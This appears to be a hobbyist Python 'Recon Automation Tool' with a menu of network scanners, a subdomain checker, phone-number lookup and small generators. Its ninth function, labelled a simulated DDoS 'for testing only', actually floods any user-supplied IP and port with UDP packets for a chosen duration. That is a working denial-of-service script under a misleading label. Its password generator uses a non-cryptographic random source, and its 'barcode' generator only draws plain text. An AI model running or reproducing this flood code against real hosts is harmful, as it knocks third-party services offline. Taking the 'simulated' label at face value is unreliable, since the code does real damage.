import socket
import random
import string
import requests
from phonenumbers import parse, geocoder, carrier
from phonenumbers.phonenumberutil import is_valid_number
from PIL import Image, ImageDraw, ImageFont
import qrcode
import time

# Function 1: IP Scanner
def ip_scanner(ip_range):
    live_hosts = []
    print(f"Scanning IP range {ip_range}...")
    for i in range(1, 255):
        ip = f"{ip_range}.{i}"
        try:
            socket.gethostbyaddr(ip)
            live_hosts.append(ip)
        except socket.herror:
            pass
    print(f"Live hosts: {live_hosts}")
    return live_hosts

# Function 2: Port Scanner
def port_scanner(ip, ports):
    open_ports = []
    print(f"Scanning ports on {ip}...")
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
    print(f"Open ports: {open_ports}")
    return open_ports

# Function 3: Barcode Generator
def generate_barcode(data, filename="barcode.png"):
    img = Image.new('RGB', (400, 200), color='white')
    draw = ImageDraw.Draw(img)
    font = ImageFont.load_default()
    draw.text((50, 80), data, fill='black', font=font)
    img.save(filename)
    print(f"Barcode saved as {filename}")

# Function 4: QR Code Generator
def generate_qrcode(data, filename="qrcode.png"):
    img = qrcode.make(data)
    img.save(filename)
    print(f"QR Code saved as {filename}")

# Function 5: Password Generator
def generate_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    print(f"Generated password: {password}")
    return password

# Function 6: Wordlist Generator
def generate_wordlist(words, filename="wordlist.txt"):
    with open(filename, 'w') as file:
        for word in words:
            file.write(word + '\n')
    print(f"Wordlist saved as {filename}")

# Function 7: Phone Number Information Gathering
def phone_number_info(phone_number):
    try:
        parsed_number = parse(phone_number)
        info = {
            "Country": geocoder.description_for_number(parsed_number, "en"),
            "Carrier": carrier.name_for_number(parsed_number, "en"),
            "Valid": is_valid_number(parsed_number)
        }
        print(f"Phone number info: {info}")
        return info
    except Exception as e:
        print(f"Error: {e}")
        return str(e)

# Function 8: Subdomain Checker
def subdomain_checker(domain, subdomains):
    valid_subdomains = []
    print(f"Checking subdomains for {domain}...")
    for subdomain in subdomains:
        url = f"http://{subdomain}.{domain}"
        try:
            response = requests.get(url, timeout=1)
            if response.status_code == 200:
                valid_subdomains.append(url)
        except requests.RequestException:
            pass
    print(f"Valid subdomains: {valid_subdomains}")
    return valid_subdomains

# Function 9: DDoS Attack Tool (Simulated for Testing Only)
def ddos_attack(ip, port, duration):
    print(f"Simulating DDoS attack on {ip}:{port} for {duration} seconds...")
    end_time = time.time() + duration
    while time.time() < end_time:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(b'X' * 1024, (ip, port))
    print("DDoS attack simulation completed.")

# Main Menu
def main():
    while True:
        print("\nRecon Automation Tool")
        print("1. IP Scanner")
        print("2. Port Scanner")
        print("3. Barcode Generator")
        print("4. QR Code Generator")
        print("5. Password Generator")
        print("6. Wordlist Generator")
        print("7. Phone Number Info")
        print("8. Subdomain Checker")
        print("9. DDoS Attack Tool")
        print("10. Exit")
        
        choice = input("Enter your choice: ")
        if choice == "1":
            ip_range = input("Enter IP range (e.g., 192.168.1): ")
            ip_scanner(ip_range)
        elif choice == "2":
            ip = input("Enter IP address: ")
            ports = list(map(int, input("Enter ports separated by commas: ").split(',')))
            port_scanner(ip, ports)
        elif choice == "3":
            data = input("Enter data for the barcode: ")
            generate_barcode(data)
        elif choice == "4":
            data = input("Enter data for the QR code: ")
            generate_qrcode(data)
        elif choice == "5":
            length = int(input("Enter password length: "))
            generate_password(length)
        elif choice == "6":
            words = input("Enter words separated by commas: ").split(',')
            generate_wordlist(words)
        elif choice == "7":
            phone_number = input("Enter phone number with country code: ")
            phone_number_info(phone_number)
        elif choice == "8":
            domain = input("Enter domain (e.g., example.com): ")
            subdomains = input("Enter subdomains separated by commas: ").split(',')
            subdomain_checker(domain, subdomains)
        elif choice == "9":
            ip = input("Enter target IP: ")
            port = int(input("Enter target port: "))
            duration = int(input("Enter duration in seconds: "))
            ddos_attack(ip, port, duration)
        elif choice == "10":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()


